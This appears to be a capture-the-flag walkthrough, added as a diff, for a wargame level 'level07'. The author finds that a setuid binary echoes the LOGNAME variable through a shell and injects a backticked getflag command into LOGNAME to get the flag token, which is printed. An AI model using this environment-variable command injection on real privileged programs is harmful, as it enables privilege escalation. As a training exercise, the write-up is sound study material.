@@ -1,0 +1,35 @@
+~$ ll
+total 24
+dr-x------ 1 level07 level07  120 Mar  5  2016 ./
+d--x--x--x 1 root    users    340 Aug 30  2015 ../
+-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout*
+-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc*
+-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07*
+-r-x------ 1 level07 level07  675 Apr  3  2012 .profile*
+
+Here we have another binary "level07", let's see what's inside.
+
+~$ strings level07
+...
+LOGNAME
+/bin/echo %s
+...
+
+This two lines are kinda interesting, it seems that 
+the program execute /bin/echo with a variable '%s'.
+
+~$ ./level07
+level07
+
+Ok so level07 actually outputs level07, and this corresponds to the LOGNAME
+environement variable.
+
+The solution seems pretty obvious here let's replace the current LOGNAME
+variable with a shell command :)
+
+~$ export LOGNAME=\`getflag\`
+
+Now execute level07 again
+
+~$ ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
